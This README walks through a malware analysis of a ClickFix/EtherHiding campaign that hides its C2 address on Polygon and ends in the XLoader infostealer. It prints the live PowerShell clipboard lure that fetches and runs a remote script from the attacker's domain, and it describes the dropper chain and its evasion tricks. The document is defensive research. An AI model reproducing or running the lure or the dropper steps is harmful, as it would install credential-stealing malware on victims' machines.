# ClickFix → EtherHiding (Polygon) → XLoader — walkthrough

This directory contains a complete, reproducible analysis of an in-the-wild **ClearFake / ClickFix** campaign that hides its C2 address on the **Polygon** blockchain (EtherHiding) and ends in a **XLoader / Formbook** infostealer delivered through a fake Cloudflare "verify you are human" overlay. Every JavaScript and PowerShell artifact named below is committed; you can follow the analysis without touching the live infrastructure.

> [!CAUTION]
> **The files under `artifacts/` are real, live malware**, captured from a compromised WordPress site, an attacker smart contract on Polygon, and an attacker HTTP C2. They are committed as inert data files (`.js`, `.b64`, `.hex`, `.ps1`, `.txt`) and will not run unless you deliberately execute them. **Do not paste `clipboard-command.txt` into Run/PowerShell, do not `node` any `.js`, do not run any `.ps1`.** The final native binary (`xloader.exe`) is deliberately **not** committed — only its hashes and PE metadata are recorded, in `artifacts/stage5-payload/README-native-payload.txt`.

## How this differs from the sibling `etherhiding/` example

Same family (EtherHiding-staged ClickFix), different everything else — a good contrast pair:

| | `etherhiding/` | `clickfix-xloader/` (this one) |
|---|---|---|
| Blockchain | BNB Smart Chain **testnet** | **Polygon** mainnet |
| Browser obfuscation | obfuscator.io string-array | `atob` + single-byte **XOR** + `new Function` |
| Selector | `0x6d4ce63c` | `0xb68d1809` |
| Social-engineering shell | rundll32 / WebDAV (Win) · `curl\|bash` (mac) | **PowerShell `iex(irm …)`**, Windows-only |
| Fake overlay | "BotGuard" captcha | **fake Cloudflare "verify you are human"** (11 languages) |
| Post-lure stages | native command straight off clipboard | 3 nested **PowerShell** layers → 7-Zip dropper |
| Final payload | not retrieved (out of scope) | **XLoader/Formbook** retrieved, hashed, characterised |

## Contents

- `sample.html` — minimal HTML shell carrying the injected loader lifted verbatim from the compromised homepage. The only thing a victim browser needs to see.
- `REPORT.md` — full malware analysis report. Read this for the findings.
- `SHA256SUMS` — integrity hashes for every committed artifact.
- `artifacts/` — every intermediate and final-stage artifact, organised by stage.

```
artifacts/
├── stage1-loader/                browser-side EtherHiding loader (carried in sample.html)
│   ├── loader.js                   the injected <script> body, obfuscated
│   ├── loader.b64                  the base64 argument of its atob('...') call
│   └── loader.deobf.js             XOR-12 decoded plaintext loader
├── stage2-contract/              on-chain C2 lookup (Polygon contract 0xB6bC9e1D...C1f2)
│   ├── eth_call-response.json      full JSON-RPC reply
│   ├── eth_call-result.hex         raw ABI-encoded return bytes
│   └── c2-string.txt               decoded → https://enter-code-cdn.info
├── stage3-clickfix/              fake-Cloudflare overlay (served from /api.php)
│   ├── api.js                      the 44 KB atob+XOR-177 blob, as served
│   ├── api.deobf.js                XOR-177 decoded overlay + victim beacon
│   └── clipboard-command.txt       the PowerShell line written to the clipboard
├── stage4-powershell/            the PowerShell chain (served from /<hash>)
│   ├── 1.downloader.as-served.ps1  XOR-42 byte array, as served to the PS user-agent
│   ├── 1.downloader.deobf.ps1      decoded → WinHttpRequest GET + scriptblock
│   ├── 2.stager.as-served.ps1      XOR-77 nested layers, from /<hash>?_=1
│   ├── 3.dropper.deobf.ps1         fully unwrapped dropper
│   └── dropper-iocs.txt            decoded URLs + archive password
└── stage5-payload/               terminal native payload (metadata only — binary NOT committed)
    └── README-native-payload.txt   7za.exe + payload.7z + xloader.exe hashes & PE facts
```

## Reproducing the analysis end-to-end

Every step below operates on the committed files. The only steps that touch the network are the two clearly marked optional re-fetches.

### 1. Static scan of the original sample

```sh
node dist/cli.js examples/clickfix-xloader/sample.html
```

reaper pulls the inline `<script>` out of the HTML and runs every analyzer on it. Expected output — three findings that describe the whole visible layer:

```
  ● [OBFUSCATION    ] atob() call — base64 decode often used to stage encoded payloads
  ● [OBFUSCATION    ] high-entropy (likely encrypted/encoded) string literal (2712 chars, entropy 5.72)
  ● [EVAL           ] new Function() constructor — eval alternative for arbitrary code execution
```

That is the entire behaviour reaper can see before decoding: base64 in, `new Function` out.

### 2. Deobfuscate the stage-1 loader

The loader is not obfuscator.io — it is a hand-rolled `atob(...)` → XOR-`12` → `new Function()` wrapper. Recover the plaintext with a one-liner (the committed `loader.deobf.js` is the expected result):

```sh
node -e '
  const b64 = require("fs").readFileSync("examples/clickfix-xloader/artifacts/stage1-loader/loader.b64","utf8").trim();
  const raw = Buffer.from(b64, "base64");
  process.stdout.write(Buffer.from(raw.map(b => b ^ 12)));
' | diff - examples/clickfix-xloader/artifacts/stage1-loader/loader.deobf.js
```

An empty diff confirms the recovery. Read `loader.deobf.js`: ~30 lines that iterate a list of Polygon RPC endpoints, `eth_call` a contract, ABI-decode the returned string into a C2 base URL, and inject `<script src="<C2>/api.php?s=<marker>&_v=<epoch-minute>">`.

### 3. Confirm the loader's indicators with triage

```sh
node dist/cli.js --triage --defang examples/clickfix-xloader/artifacts/stage1-loader/loader.deobf.js
```

Expected: `SUSPICIOUS`, 9 IOCs — the Polygon contract address `0xB6bC9e1D...C1f2` and the eight fallback RPC endpoints the loader rotates through.

### 4. (Optional — one network read) Fetch the C2 address from the contract

This is the **only step that reads the blockchain**. It is an `eth_call` (a read: no gas, no signed transaction). The sibling example's helper handles Polygon via `--rpc`/`--selector`:

```sh
node examples/etherhiding/fetch-evm-payload.mjs \
    0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2 \
    --selector 0xb68d1809 --rpc https://polygon.drpc.org --raw --json
```

`preview_utf8` should read `https://enter-code-cdn.info`, matching the committed `artifacts/stage2-contract/c2-string.txt`. **If it differs, the operator has rotated the C2 on-chain** — a finding in itself (see REPORT §2.1).

### 5. Deobfuscate the ClickFix overlay

`api.js` (served from `/api.php`) uses the same scheme as the loader but with XOR key `177`:

```sh
node -e '
  const s = require("fs").readFileSync("examples/clickfix-xloader/artifacts/stage3-clickfix/api.js","utf8");
  const b64 = s.match(/atob\(.([A-Za-z0-9+/=]+)./)[1];
  process.stdout.write(Buffer.from(Buffer.from(b64,"base64").map(b => b ^ 177)));
' | diff - examples/clickfix-xloader/artifacts/stage3-clickfix/api.deobf.js
```

Then pull its indicators:

```sh
node dist/cli.js --iocs --defang examples/clickfix-xloader/artifacts/stage3-clickfix/api.deobf.js
```

Expected IOCs: `enter-code-cdn.info` (as `cmdUrl`), `/api.php` (the victim-tracking beacon endpoint), and a spoofed `cloudflare.com`. Read `api.deobf.js`: it builds a full-screen fake Cloudflare "verify you are human" overlay in 11 languages, AES-GCM-encrypts the victim's URL/referrer and beacons it to `/api.php`, and on the fake "verify" click copies the PowerShell lure to the clipboard.

### 6. Read the clipboard lure

```sh
cat examples/clickfix-xloader/artifacts/stage3-clickfix/clipboard-command.txt
```

```
powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' -UseBasicParsing)"; exit <#<spoofed-CF-RayID>#>
```

`-w h` hides the window; `iex(irm …)` runs a remote script fileless. The `<# … #>` block comment holds a **spoofed Cloudflare Ray ID** so the pasted blob looks like it carries a legitimate "verification code". The 16-hex path is minted fresh per visit (see REPORT §3.4).

### 7. Unwrap the PowerShell chain

The three PowerShell layers are committed both as-served and decoded. Each layer is a simple XOR-obfuscated byte array; the decode logic is visible at the bottom of each `*.as-served.ps1`:

```sh
cat examples/clickfix-xloader/artifacts/stage4-powershell/1.downloader.deobf.ps1  # bxor 42 → WinHttp GET
cat examples/clickfix-xloader/artifacts/stage4-powershell/3.dropper.deobf.ps1     # the dropper
cat examples/clickfix-xloader/artifacts/stage4-powershell/dropper-iocs.txt        # decoded URLs + password
```

The dropper downloads a 7-Zip extractor and a password-protected archive (`password1234`), extracts `xloader.exe`, `Start-Process`es it, and pings a success beacon.

### 8. Terminal payload

```sh
cat examples/clickfix-xloader/artifacts/stage5-payload/README-native-payload.txt
```

`xloader.exe` is **819 MB on disk but only ~250 KB is real code** — the rest is null padding to defeat AV/sandbox size caps. The binary is not committed; its SHA-256 and PE facts are recorded here for pivoting.

## Verifying integrity

```sh
cd examples/clickfix-xloader && sha256sum -c SHA256SUMS
```

The `artifacts/` tree is a frozen snapshot from 2026-07-28. The live contract state and the per-visit hashes rotate, so re-fetches via steps 4–6 may differ.

## See also

`REPORT.md` (this directory) — findings, indicators, detections, and limitations.
